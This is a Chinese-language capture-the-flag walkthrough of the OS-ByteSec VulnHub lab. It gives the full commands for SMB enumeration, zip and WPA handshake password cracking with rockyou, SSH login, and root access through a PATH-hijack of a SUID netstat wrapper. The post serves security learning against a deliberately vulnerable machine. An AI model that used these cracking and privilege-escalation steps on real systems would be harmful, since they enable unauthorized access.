---
layout: post
title: "Os ByteSec walkthrough"
date: 2021-06-29
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP               |
| ------------- | ---------------- |
| 本机（Win10） | `192.168.36.234` |
| Kali          | `192.168.36.89`  |
| OS-ByteSec    | `192.168.36.190` |

### 扫描端口和版本信息

`nmap -A 192.168.36.190`

```shell
┌──(root💀kali)-[~]
└─# nmap -A 192.168.36.190
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-29 04:40 UTC
Nmap scan report for 192.168.36.190
Host is up (0.017s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Hacker_James
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2525/tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)
|   256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)
|_  256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: NITIN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -18h00m26s, deviation: 3h10m30s, median: -16h10m27s
|_nbstat: NetBIOS name: NITIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nitin
|   NetBIOS computer name: NITIN\x00
|   Domain name: 168.1.7
|   FQDN: nitin.168.1.7
|_  System time: 2021-06-28T18:00:43+05:30
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-06-28T12:30:43
|_  start_date: N/A
...
```

结果显示靶机开启了**80**端口、smb服务的**139/445**端口，以及ssh服务的**2525**端口。下一步对**80**端口下进行目录枚举，不过结果中没有发现什么有用的信息，之后在查看首页面源码时发现关键信息：

```html
<meta name="description" content="Cloud 83 - hosting template ">
```

代表该网站使用的是*Cloud 83* CMS，但google搜索网站目录结构也没什么信息。之后根据页面的提示信息`###################GET#####smb##############free`，试试smb服务枚举，并且在使用*enum4linux*工具后的输出结果中发现3个用户

```shell
┌──(root💀kali)-[~]
└─# enum4linux -A 192.168.36.190
...
 ==========================
|    Target Information    |
 ==========================
Target ........... 192.168.36.190
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\sagar (Local User)
S-1-22-1-1001 Unix User\blackjax (Local User)
S-1-22-1-1002 Unix User\smb (Local User)
...
```

之后使用*smbclient*工具登录到smb服务器上，在结果中发现有用信息：

```shell
┌──(root💀kali)-[~]
└─# smbclient //192.168.36.190/smb -U smb -p
Enter WORKGROUP\sagar's password:
Try "help" to get a list of possible commands.
smb: \> help
...
smb: \> get main.txt
getting file \main.txt of size 10 as main.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> get safe.zip
getting file \safe.zip of size 3424907 as safe.zip (246.5 KiloBytes/sec) (average 246.1 KiloBytes/sec)
smb: \> q
```

其中压缩文件*safe.zip*需要密码才能解压，那么就使用*fcrackzip*工具进行zip密码爆破，得到解压密码：`hacker1`。

```shell
 fcrackzip -D -p /usr/share/wordlists/Passwords/Leaked-Databases/rockyou.txt -u safe.zip
```

注意到解压结果中有个*user.cap*网络数据包文件。

```shell
┌──(root💀kali)-[~]
└─# unzip safe.zip
Archive:  safe.zip
[safe.zip] secret.jpg password:
  inflating: secret.jpg
  inflating: user.cap
```

使用*capinfos*查看数据包信息，知道该数据包捕获的是*IEEE 802.11 Wireless LAN*，那么我们就可以使用*aircrack-ng*工具进行破解，得到wifi密码：`snowflake`。

```shell
┌──(root💀kali)-[~]
└─# aircrack-ng -w /usr/share/wordlists/Passwords/Leaked-Databases/rockyou.txt user.cap
Reading packets, please wait...
Opening user.cap
Read 49683 packets.

   #  BSSID              ESSID                     Encryption

   1  56:DC:1D:19:52:BC  blackjax                  WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening user.cap
Read 49683 packets.

1 potential targets

                               Aircrack-ng 1.6

      [00:00:03] 1498/14344391 keys tested (490.93 k/s)

      Time left: 8 hours, 7 minutes, 51 seconds                  0.01%

                           KEY FOUND! [ snowflake ]


...
```

### Getshell

使用账户名和密码`blackjax:snowflake`进行ssh登录，在该用户目录下得到第一个flag。

```shell
┌──(root💀kali)-[~]
└─# ssh blackjax@192.168.36.190 -p 2525
The authenticity of host '[192.168.36.190]:2525 ([192.168.36.190]:2525)' can't be established.
ECDSA key fingerprint is SHA256:5gu5GYZGsKZdvbswwXjbx8FgUET16ucBiRrer1dGn80.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
$ cat user.txt
  _    _  _____ ______ _____        ______ _               _____
 | |  | |/ ____|  ____|  __ \      |  ____| |        /\   / ____|
 | |  | | (___ | |__  | |__) |_____| |__  | |       /  \ | |  __
 | |  | |\___ \|  __| |  _  /______|  __| | |      / /\ \| | |_ |
 | |__| |____) | |____| | \ \      | |    | |____ / ____ \ |__| |
  \____/|_____/|______|_|  \_\     |_|    |______/_/    \_\_____|



Go To Root.

MD5-HASH : f589a6959f3e04037eb2b3eb0ff726ac
```

### 提权

查找该用户下具备SUID权限的文件时，发现一个特殊脚本文件：`/usr/bin/netscan`，并且在运行该脚本后的输出结果内容是查看网络连接，并且是*netstat*工具的衍生脚本。

```shell
$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/netscan
/usr/bin/sudo
/bin/ping6
/bin/fusermount
/bin/mount
/bin/su
/bin/ping
/bin/umount
/bin/ntfs-3g
```

因此我们可以通过PATH环境变量进行提权，具体操作可以查看[这篇文章](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)。在该实例中进行以下操作步骤：

1. 进入*/tmp*目录下，方便创建文件
2. 创建一个shell脚本文件，文件名为*netstat*，执行命令：`echo "/bin/bash" > netstat`
3. 将*/tmp*目录添加到`$PATH`环境变量下，这样该目录下的脚本文件就可以在随意位置下执行，执行命令：`export PATH=/tmp:$PATH`
4. 执行*/usr/bin/netscan*脚本后就会切换到*root*账户

得到最后一个flag：

```shell
root@nitin:/root# cat root.txt
    ____  ____  ____  ______   ________    ___   ______
   / __ \/ __ \/ __ \/_  __/  / ____/ /   /   | / ____/
  / /_/ / / / / / / / / /    / /_  / /   / /| |/ / __
 / _, _/ /_/ / /_/ / / /    / __/ / /___/ ___ / /_/ /
/_/ |_|\____/\____/ /_/____/_/   /_____/_/  |_\____/
                     /_____/
Conguratulation..

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Contact : https://www.linkedin.com/in/rahulgehlaut/

WebSite : jameshacker.me
```

### 总结

提权过程执行成功的主要原因是*/usr/bin/netscan*脚本文件所属用户是*root*，并且改脚本执行过程中需要使用系统中的*netstat*工具，又因为我们在*/tmp*目录下新建了一个相同的*netstat*脚本文件，并且已经添加到系统变量里，因此在使用*netstat*工具时就会使用我们新建的*netstat*脚本，从而返回了一个shell。在此之前需要注意的是将*/tmp*目录添加在环境变量最前面。

### Ref.

- [smb枚举](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)